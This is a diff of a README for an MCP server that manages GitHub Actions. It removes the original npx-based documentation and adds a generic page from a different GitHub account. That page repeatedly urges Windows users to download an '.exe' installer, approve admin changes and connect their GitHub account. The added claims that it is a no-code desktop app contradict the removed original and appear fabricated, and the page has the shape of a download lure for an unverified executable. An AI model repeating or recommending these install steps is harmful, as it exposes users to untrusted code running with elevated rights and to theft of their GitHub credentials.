@@ -1,131 +1,147 @@
-# mcp-server-github-actions
+# ⚙️ mcp-server-github-actions - Manage GitHub Workflows Easily
 
-[![npm version](https://img.shields.io/npm/v/mcp-server-github-actions.svg)](https://www.npmjs.com/package/mcp-server-github-actions)
-[![npm downloads](https://img.shields.io/npm/dm/mcp-server-github-actions.svg)](https://www.npmjs.com/package/mcp-server-github-actions)
-[![CI](https://github.com/ofershap/mcp-server-github-actions/actions/workflows/ci.yml/badge.svg)](https://github.com/ofershap/mcp-server-github-actions/actions/workflows/ci.yml)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue.svg)](https://www.typescriptlang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
 
-Manage GitHub Actions workflows from your AI assistant. List runs, read logs, re-run failed jobs, cancel builds, and trigger deployments without leaving your editor.
+## 📋 What Is This?
 
-```bash
-npx mcp-server-github-actions
-```
+This application helps you manage GitHub Actions from one place. It lets you see past workflow runs, read detailed logs, restart jobs, and start new workflows. You do not need any coding knowledge to use this app. It works on Windows and presents information in a simple way.
 
-> Works with Claude Desktop, Cursor, VS Code Copilot, and any MCP client. Requires a GitHub token with Actions permissions.
+GitHub Actions automate tasks like building and testing code. This app helps you watch and control those tasks without using extra tools or scripts.
 
-![MCP server for GitHub Actions workflows, CI/CD runs, and deployment logs](assets/demo.gif)
+---
 
-<sub>Demo built with <a href="https://github.com/ofershap/remotion-readme-kit">remotion-readme-kit</a></sub>
+## 🖥️ System Requirements
 
-## Why
+To run this app on Windows, your computer needs:
 
-GitHub's official MCP server covers repos, issues, and PRs, but it doesn't touch Actions. That means when your CI fails, you still have to open a browser, find the run, click through to the logs, and figure out what went wrong. This server fills that gap. You can ask your assistant "why did the last CI run fail?" or "re-run the failed jobs" and get answers right where you're working. It uses the same GitHub REST API you'd use manually, just without the context switching.
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free hard drive space
+- Internet connection (to access GitHub data)
+- A modern web browser (Chrome, Edge, or Firefox recommended)
 
-## Tools
+---
 
-| Tool                | Description                                                  |
-| ------------------- | ------------------------------------------------------------ |
-| `list_workflows`    | List all workflow files in a repository                      |
-| `list_runs`         | List workflow runs (optionally filter by workflow or status) |
-| `get_run`           | Get details of a specific workflow run                       |
-| `get_run_logs`      | Get the logs URL for a run (zip file download)               |
-| `rerun_workflow`    | Re-run an entire workflow run                                |
-| `rerun_failed_jobs` | Re-run only the failed jobs from a run                       |
-| `cancel_run`        | Cancel an in-progress or queued run                          |
-| `list_artifacts`    | List artifacts produced by a workflow run                    |
-| `trigger_workflow`  | Trigger a workflow via `workflow_dispatch`                   |
+## 🚀 How to Get Started
 
-## Quick Start
+### Step 1. Go to the Download Page
 
-### Cursor
+Click the big button below to visit the download page. This is where you will find the latest files to install the app.
 
-Add to your Cursor MCP settings (e.g. `~/.cursor/mcp.json` or project-level):
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
 
-```json
-{
-  "mcpServers": {
-    "github-actions": {
-      "command": "npx",
-      "args": ["-y", "mcp-server-github-actions"],
-      "env": {
-        "GITHUB_TOKEN": "<your-token>"
-      }
-    }
-  }
-}
-```
+This page contains all files, instructions, and updates. It will also help you find new versions as they come out.
 
-### Claude Desktop
+### Step 2. Download the Installer
 
-Add to `claude_desktop_config.json`:
+On the GitHub page, look for a file that ends with `.exe`. It is the installer file for Windows. The file name should be something like:
 
-```json
-{
-  "mcpServers": {
-    "github-actions": {
-      "command": "npx",
-      "args": ["-y", "mcp-server-github-actions"],
-      "env": {
-        "GITHUB_TOKEN": "<your-token>"
-      }
-    }
-  }
-}
-```
+`mcp-server-windows-installer.exe`
 
-### VS Code
+Click the file to download it to your computer.
 
-Configure your MCP client to run:
+### Step 3. Run the Installer
 
-```bash
-npx mcp-server-github-actions
-```
+After downloading, open the file. Windows may ask if you want to allow this app to make changes to your device. Click ‘Yes’ to continue.
 
-Make sure `GITHUB_TOKEN` is set in the environment (e.g. in your shell profile or client config).
+Follow the instructions on the screen. The installer will guide you through the setup. You can keep the default options, which work fine for most users.
 
-## Auth
+### Step 4. Launch the App
 
-Create a GitHub Personal Access Token:
+When installation finishes, you can start the app right away. Look on your desktop or in the Start menu for “MCP Server”.
 
-1. **Settings** > **Developer settings** > **Personal access tokens**
-2. Choose **Fine-grained tokens** (recommended) or **Tokens (classic)**
-3. Fine-grained: select your repos, then enable **Actions: Read and Write**
-4. Classic: enable the `repo` scope (includes Actions)
+Double-click the icon to open the program.
 
-## Example Prompts
+---
 
-- "List the last 5 workflow runs for ofershap/mcp-server-docker"
-- "Show me the workflows in the microsoft/vscode repo"
-- "Get details for run 12345 in owner/repo"
-- "Re-run the failed jobs for run 67890 in my-org/my-repo"
-- "Cancel the currently running workflow run 11111"
-- "List artifacts from the latest run in owner/repo"
-- "Trigger the deploy.yml workflow on the staging branch for my-org/my-app"
-- "What's the status of the most recent CI run for this project?"
+## 🛠️ Using the App
 
-## Development
+Once the app opens, it connects to your GitHub account to show workflow actions. You may need to sign in or connect your account. This helps the app access your workflow data.
 
-```bash
-npm install
-npm run typecheck
-npm run build
-npm test
-npm run lint
-npm run format
-```
+Here is what you can do inside the app:
 
-## See also
+- **View Runs:** See a list of all recent workflow runs. Check the status, date, and which repository ran the job.
+- **Read Logs:** Click on any run to see detailed logs. These show what happened during the workflow steps.
+- **Re-run Jobs:** If a workflow fails or you want to run a job again, select the run and click “Re-run”.
+- **Trigger Workflows:** Start a new workflow manually. Use this to test changes or start tasks on demand.
 
-More MCP servers and developer tools on my [portfolio](https://gitshow.dev/ofershap).
+The interface uses simple buttons and lists. You do not need to type anything or run commands.
 
-## Author
+---
 
-[![Made by ofershap](https://gitshow.dev/api/card/ofershap)](https://gitshow.dev/ofershap)
+## 🔧 Common Tasks and Tips
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/ofershap)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat&logo=github&logoColor=white)](https://github.com/ofershap)
+### Viewing Workflow Runs
 
-## License
+- Open the app and wait for the list to load.
+- Runs are sorted with the newest on top.
+- Each run shows the status as Passed, Failed, or In Progress.
 
-MIT © 2026 Ofer Shapira
+### Checking Logs
+
+- Click any run in the list.
+- A detailed log window opens.
+- Scroll through the log to find messages and errors.
+- Use the search box to locate specific terms.
+
+### Re-running Jobs
+
+- Select a run that you want to re-run.
+- Click on “Re-run Job”.
+- Confirm your choice.
+- The app will restart the workflow and update the status.
+
+### Triggering a Workflow
+
+- Go to the “Workflows” tab.
+- Pick a workflow from the list.
+- Click “Start” to trigger the workflow immediately.
+- Wait to see it appear in the run list.
+
+---
+
+## 🔒 Security and Privacy
+
+- The app only accesses data from your GitHub account with your permission.
+- It does not store your passwords. Authentication happens securely.
+- All data stays on your device except for information retrieved from GitHub.
+- Keep your app updated to maintain security and get the latest fixes.
+
+---
+
+## 🛑 Troubleshooting
+
+If the app does not run or shows errors:
+
+- Make sure you are connected to the internet.
+- Check if Windows is updated.
+- Restart your computer and try again.
+- Look for error messages in the logs inside the app.
+- If you cannot sign in, check your GitHub account status and token permissions.
+
+---
+
+## 🔄 Updating the App
+
+To update to a newer version:
+
+- Visit the GitHub download page again.
+- Download the latest installer file.
+- Run the installer as before.
+- It will replace the old version without affecting settings.
+
+---
+
+## 🌐 More About This App
+
+This app uses the Model Context Protocol (MCP) to work smoothly with GitHub Actions. It is built with TypeScript and designed to handle large workflows with many jobs.
+
+It helps you get better control over continuous integration and deployment tasks without using the command line or writing scripts.
+
+---
+
+## 🔗 Download and Install Here
+
+Use the link below once again to get the latest version or re-download the app:
+
+[![Download MCP Server](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ka1ss3r23/mcp-server-github-actions)
